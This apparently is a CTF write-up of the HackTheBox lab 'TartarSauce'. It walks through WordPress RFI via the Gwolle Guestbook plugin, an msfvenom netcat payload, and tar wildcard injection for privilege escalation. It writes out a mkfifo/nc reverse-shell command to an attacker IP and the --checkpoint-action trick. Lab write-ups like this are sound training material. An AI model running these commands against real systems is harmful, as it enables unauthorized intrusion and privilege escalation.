@@ -1,0 +1,71 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox TartarSauce Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-tartarsauce-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-11-15T09:07:13+00:00">November 15, 2018</time><time class="updated" datetime="2025-07-05T12:52:35+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “TarTarSauce”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
+<p><span style="color: #000000;"><strong>Level</strong>: Expert</span></p>
+<p><span style="color: #000000;"><strong>Task</strong>: To find user.txt and root.txt file</span></p>
+<p><span style="color: #000000;"><strong>Note</strong>: Since these labs are online available therefore they have a static IP. The IP of TarTarSauce is 10.10.10.88</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
+<li><span style="color: #000000;">Directory Enumeration (Drib)</span></li>
+<li><span style="color: #000000;">Exploiting WordPress against RFI Vulnerability</span></li>
+<li><span style="color: #000000;">Spawning TTY shell</span></li>
+<li><span style="color: #000000;">Check sudoers list permissions</span></li>
+<li><span style="color: #000000;">Wildcard injection privilege escalation</span></li>
+<li><span style="color: #000000;">Modify the backup file to get root flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
+<p><span style="color: #000000;">Let’s start off with our basic nmap command to find out the open ports and services.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.88</pre>
+<p><span style="color: #000000;">From the given below image, you can observe we found port 80 is open for http service and found robot.txt with 5 disallowed entries.</span></p>
+<p><img decoding="async" src="https://3.bp.blogspot.com/-DNg3pCHEqpI/W_5fAEe1MKI/AAAAAAAAbe8/7y4eKq4rA7c6D5U_nk6OZeokcs2qOHomACLcBGAs/s1600/1.png"/></p>
+<p><span style="color: #000000;">Let’s navigate to port 80 through a web browser. By exploring IP in the URL box, it puts up following web page as shown in the below image.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-IK7UTS4M2U0/W_5fBYu4dAI/AAAAAAAAbfM/IxtyzS83nhYBbQW7MrexJ5dmQsJQCOXrwCLcBGAs/s1600/2.png"/></p>
+<p><span style="color: #000000;">We run dirb to list the directories as we can’t locate anything on the webpage. A directory named “/webservices/” is located. Since there is nothing in the directory “/webservices/,” we further enumerate it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.10.88
+dirb http://10.10.10.88/webservices/</pre>
+<p><img decoding="async" src="https://4.bp.blogspot.com/-jtpNYXTM-jg/W_5fBQ4Q_vI/AAAAAAAAbfQ/Xtqm-L5kMAsKG2nWmfcJd9bjCwfq2RbEwCLcBGAs/s1600/3.png"/></p>
+<p><span style="color: #000000;">Dirb scan gave us the directory called “/webservices/wp/” that hosts a WordPress site.</span></p>
+<p><img decoding="async" src="https://4.bp.blogspot.com/-uix126wmm6I/W_5fBglMrPI/AAAAAAAAbfU/igJR9mkKMocOHFPzH_kL6aLCeB_LI6LpwCLcBGAs/s1600/4.png"/></p>
+<p><span style="color: #000000;">After running wpscan to list all of the themes and plugins, we discover that the “Gwolle Guestbook” plugin is weak. Our investigation reveals that it is susceptible to Remote File Inclusion (RFI).</span></p>
+<p><img decoding="async" src="https://4.bp.blogspot.com/-Kl24DlmgSOQ/W_5fB_qMFkI/AAAAAAAAbfY/a_XW0XJNqawfA5FQwe8yX0Hy9Yg7rLWggCLcBGAs/s1600/5.png"/></p>
+<p><span style="color: #000000;">We utilize the php-reverse-shell.php available on Kali Linux and follow the guidelines provided by the exploit-db proof of concept. To run our PHP shell using RFI, we transfer it to the desktop and rename it to wp-load.php. To exploit RFI on the target computer, we start our Python HTTP server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-I9aEoaRckDE/W_5fB_1OrLI/AAAAAAAAbfc/I6o8pFr75cEe4paEqhT3TUDgnl6StyH9QCLcBGAs/s1600/7.png"/></p>
+<p><span style="color: #000000;">When we run our PHP shell through RFI, we are able to successfully obtain a reverse shell. We have set up our listener using netcat. We navigate to the “/home” directory and locate the “onuma” folder. The “onuma” directory cannot be accessed. Thus, we use Python to launch a TTY shell in order to verify the sudoers list.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c "import pty; pty.spawn('/bin/bash')"</pre>
+<p><span style="color: #000000;">We check the sudoers list and find that we can run tar as user “onuma” without any password. Hence we can exploit wild card injection for privilege escalation.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
+<p><img decoding="async" src="https://4.bp.blogspot.com/-SEgWjqN100k/W_5fCfyITZI/AAAAAAAAbfg/Y1L0FoVs_1A_aY0wt5_uR1fpjD8qZDJPgCLcBGAs/s1600/8.png"/></p>
+<p><span style="color: #000000;">We create an nc reverse shell using msfvenom.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p cmd/unix/reverse_netcat lhost=10.10.14.177 lport=4444 R</pre>
+<p><img decoding="async" src="https://3.bp.blogspot.com/-lW6N_CFqiFU/W_5fCsVnTII/AAAAAAAAbfk/HcIkaF2BPPY3szbQebcIkHgb436n3vj4gCLcBGAs/s1600/9.png"/></p>
+<p><span style="color: #000000;">Now we move to the reverse shell and create a bash file using the nc command and save it as “wp.sh”.</span></p>
+<p><span style="color: #000000;">Now tar has the ability to execute the command using “–checkpoint-action”. So we created a file named “–checkpoint-action=exec=sh wp.sh” and “–checkpoint=1”.  So that we can execute our command as user onuma.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir data
+cd data
+echo "mkfifo /tmp/cezbk; nc 10.10.14.177 4444 0&lt;/tmp/cezbk | /bin/sh&gt;/tmp/cezbk 2&gt;&amp;1; rm /tmp/cezbk" &gt; wp.sh
+echo "" &gt; "--checkpoint-action=exec=sh wp.sh"
+echo "" &gt; --checkpoint=1
+sudo -u onuma /bin/tar cf archive.tar *</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-VSMVd8YJpXc/W_5fAK3Kn_I/AAAAAAAAbe4/KVKdeOAwYbYMV-8jdphGEUYNI-nwpvuKgCLcBGAs/s1600/10.png"/></p>
+<p><span style="color: #000000;">We use setup our listener using netcat, as soon as we run the tar command as user “onuma” we get our reverse shell as user “onuma”. Then, we change the directory to /home/onuma and find the file called “user.txt”. Following this we take a look at the content of the file and find the 1<sup>st</sup> flag. After finding the flag we spawn a tty shell using python.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c 'import pty; pty.spawn("/bin/bash")'</pre>
+<p><img decoding="async" src="https://2.bp.blogspot.com/-qriDEWmPIxc/W_5e_6OYNfI/AAAAAAAAbe0/1S1gFLSHNw407_KiOtRLyO--elhkGyCsACLcBGAs/s1600/11.png"/></p>
+<p><span style="color: #000000;">Enumerating through the system we find a file a called a backuperer that has been symlinked to a file a named “backup” in “/usr/local/bin directory”.</span></p>
+<p><img decoding="async" src="https://4.bp.blogspot.com/-b6sgb2bU1WE/W_5fAl7woNI/AAAAAAAAbfA/LJ4-bUIgSZoXK-Xai3wUogalZGJWBToUwCLcBGAs/s1600/13.png"/></p>
+<p><span style="color: #000000;">We take a look at the content of the file and find that it is a file that creates a gzip archive of files inside “/var/www/html/”. It also checks the integrity of the file after 30 seconds from the creation of the file.</span></p>
+<p><img decoding="async" src="https://2.bp.blogspot.com/-Vil5BJqS_04/W_5fA9ZMe9I/AAAAAAAAbfE/KBCBRZgeafsz-pDn2vVo74pSk1B1YQBNgCLcBGAs/s1600/14.png"/></p>
+<p><span style="color: #000000;">We use a script that takes advantage of the “sleep” function of the script. As it waits for 30 seconds and then checks the integrity of the file we have 30 seconds to recreate the archive. We use this script <a style="color: #000000;" href="https://pastebin.com/4AgANNsi">here</a>.  After running the script we find the root flag.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-3JR642XKEXo/W_5fA-s3EyI/AAAAAAAAbfI/wYBov-Dr0GkNT7VTvp_RYUIQBkC3cnpcwCLcBGAs/s1600/15.png"/></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
